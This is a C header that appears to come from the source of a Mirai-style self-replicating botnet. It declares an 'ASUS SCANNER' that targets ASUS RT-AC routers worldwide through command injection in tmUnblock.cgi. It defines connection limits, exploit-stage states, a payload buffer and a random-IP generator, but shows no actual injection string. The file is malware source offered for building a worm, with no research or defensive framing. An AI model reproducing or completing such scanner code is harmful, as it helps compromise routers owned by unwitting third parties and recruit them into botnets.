#ifdef SELFREP

/* ============================================================================
 * ASUS SCANNER - Router Command Injection (Port 8080)
 * ============================================================================
 * Exploit: ASUS RT-AC series command injection via tmUnblock.cgi
 * Targets: ASUS RT-AC routers globally
 * Method: CGI command injection
 * Regions: All regions with ASUS router deployments
 * ============================================================================ */

#pragma once

#include <stdint.h>

#include "includes.h"

#ifdef X86_64
#define asus_SCANNER_MAX_CONNS 512
#define asus_SCANNER_RAW_PPS 1440
#else
#define asus_SCANNER_MAX_CONNS 256
#define asus_SCANNER_RAW_PPS 1024
#endif

#ifdef X86_64
#define asus_SCANNER_RDBUF_SIZE 1024
#define asus_SCANNER_HACK_DRAIN 64
#else
#define asus_SCANNER_RDBUF_SIZE 1024
#define asus_SCANNER_HACK_DRAIN 64
#endif

struct asus_scanner_connection
{
    int fd, last_recv;
    enum
    {
        asus_SC_CLOSED,
        asus_SC_CONNECTING,
        asus_SC_EXPLOIT_STAGE2,
        asus_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[asus_SCANNER_RDBUF_SIZE];
    char payload_buf[2024];
};

void asus_scanner_init();
void asus_scanner_kill(void);

static void asus_setup_connection(struct asus_scanner_connection *);
static ipv4_t asus_get_random_ip(void);

#endif

